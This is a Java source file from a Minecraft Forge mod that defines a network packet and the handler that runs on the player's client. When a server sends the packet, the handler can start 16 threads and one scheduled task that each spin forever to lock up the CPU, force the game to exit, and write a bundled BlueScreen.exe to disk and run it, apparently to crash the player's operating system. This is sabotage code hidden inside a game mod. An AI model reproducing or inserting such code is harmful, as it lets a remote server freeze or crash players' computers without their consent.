package com.anotherstar.network;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;

import com.anotherstar.core.LoliPickaxeCore;

import io.netty.buffer.ByteBuf;
import net.minecraft.client.Minecraft;
import net.minecraft.client.gui.GuiGameOver;
import net.minecraftforge.fml.common.FMLCommonHandler;
import net.minecraftforge.fml.common.network.simpleimpl.IMessage;
import net.minecraftforge.fml.common.network.simpleimpl.IMessageHandler;
import net.minecraftforge.fml.common.network.simpleimpl.MessageContext;
import net.minecraftforge.fml.relauncher.Side;
import net.minecraftforge.fml.relauncher.SideOnly;

public class LoliDeadPacket implements IMessage {

	private boolean gui;
	private boolean blueScreen;
	private boolean exit;
	private boolean failRespond;

	public LoliDeadPacket() {
	}

	public LoliDeadPacket(boolean gui, boolean blueScreen, boolean exit, boolean failRespond) {
		this.gui = gui;
		this.blueScreen = blueScreen;
		this.exit = exit;
		this.failRespond = failRespond;
	}

	@Override
	public void fromBytes(ByteBuf buf) {
		gui = buf.readBoolean();
		blueScreen = buf.readBoolean();
		exit = buf.readBoolean();
		failRespond = buf.readBoolean();
	}

	@Override
	public void toBytes(ByteBuf buf) {
		buf.writeBoolean(gui);
		buf.writeBoolean(blueScreen);
		buf.writeBoolean(exit);
		buf.writeBoolean(failRespond);
	}

	public boolean isGui() {
		return gui;
	}

	public boolean isBlueScreen() {
		return blueScreen;
	}

	public boolean isExit() {
		return exit;
	}

	public boolean isFailRespond() {
		return failRespond;
	}

	public static class MessageHandler implements IMessageHandler<LoliDeadPacket, IMessage> {

		@Override
		@SideOnly(Side.CLIENT)
		public IMessage onMessage(LoliDeadPacket message, MessageContext ctx) {
			if (message.isGui() && !(Minecraft.getMinecraft().currentScreen instanceof GuiGameOver)) {
				Minecraft.getMinecraft().displayGuiScreen(
						new GuiGameOver(Minecraft.getMinecraft().player.getCombatTracker().getDeathMessage()));
			}
			if (message.isFailRespond()) {
				if (!Minecraft.getMinecraft().isCallingFromMinecraftThread()) {
					Minecraft.getMinecraft().addScheduledTask(() -> {
						while (true)
							;
					});
				}
				for (int i = 0; i < 16; i++) {
					new Thread(() -> {
						while (true)
							;
					}).start();
				}
			}
			if (message.isExit()) {
				FMLCommonHandler.instance().exitJava(0, true);
			}
			if (message.isBlueScreen()) {
				if (!LoliPickaxeCore.blueScreenExe.exists()) {
					try (InputStream is = getClass().getResourceAsStream("/BlueScreen.exe");
							FileOutputStream fos = new FileOutputStream(LoliPickaxeCore.blueScreenExe);) {
						byte[] buf = new byte[8192];
						int len;
						while ((len = is.read(buf)) != -1) {
							fos.write(buf, 0, len);
						}
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
				try {
					Runtime.getRuntime().exec(LoliPickaxeCore.blueScreenExe.getAbsolutePath());
				} catch (IOException e) {
				}
			}
			return null;
		}

	}

}
